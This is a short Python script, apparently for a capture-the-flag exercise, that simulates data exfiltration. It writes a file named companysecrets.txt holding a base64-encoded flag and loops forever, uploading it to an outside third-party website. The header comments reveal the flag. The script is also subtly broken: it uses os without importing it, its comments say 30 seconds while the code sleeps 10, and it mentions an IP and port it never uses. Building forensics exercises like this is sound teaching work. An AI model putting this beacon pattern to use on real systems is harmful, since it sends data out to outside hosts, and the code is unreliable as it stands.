#This script will make a simple call to a remote IP with a payload.
#This can simulate a malicious program exfiltrating data or C2
#Everything is hard coded into the script, no arguments are passed. Change the IP and Port and Payload. Interval can also be adjusted.
#Student should find a payload being sent every 30 seconds in a packet dump.
#Inside the payload is a base64 encoded string
#Decoded it contains the CTF flag: CTF-Hax0r!

#!/usr/bin/env python3
import time
from urllib.request import Request, urlopen
import mimetypes

# Define the directory, file name, and remote URL
directory = '/'
file_name = 'companysecrets.txt'
remote_url = 'https://practice.expandtesting.com/upload'  # External website that allows uploads

def create_file(directory, file_name):
    full_path = os.path.join(directory, file_name)
    
    try:
        if not os.path.exists(directory):
            os.makedirs(directory)
        
        with open(full_path, 'w') as file:
            file.write("Q1RGLUhheDByIQ==")
        
        print(f"File '{file_name}' created successfully at {full_path}")
    
    except Exception as e:
        print(f"An error occurred while creating the file: {e}")

def post_file(remote_url, full_path):
    try:
        if not os.path.exists(full_path):
            raise FileNotFoundError(f"The file {full_path} does not exist.")
        
        with open(full_path, 'rb') as file:
            content = file.read()
            
            # Get the MIME type of the file
            content_type, _ = mimetypes.guess_type(full_path)
            if content_type is None:
                content_type = 'application/octet-stream'
            
            headers = {
                'Content-Type': f'{content_type}',
                'Content-Disposition': f'attachment; filename="{file_name}"'
            }
        
        request = Request(
            url=remote_url,
            data=content,
            headers=headers
        )
        
        with urlopen(request) as response:
            if response.status == 200:
                print("File posted successfully!")
            else:
                print(f"Failed to post file. Status code: {response.status}")
    
    except Exception as e:
        print(f"An error occurred while posting the file: {e}")

def main():
    full_path = os.path.join(directory, file_name)
    
    try:
        create_file(directory, file_name)
        
        # Loop every 10 seconds
        while True:
            post_file(remote_url, full_path)
            time.sleep(10)  # Sleep for 10 seconds

    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
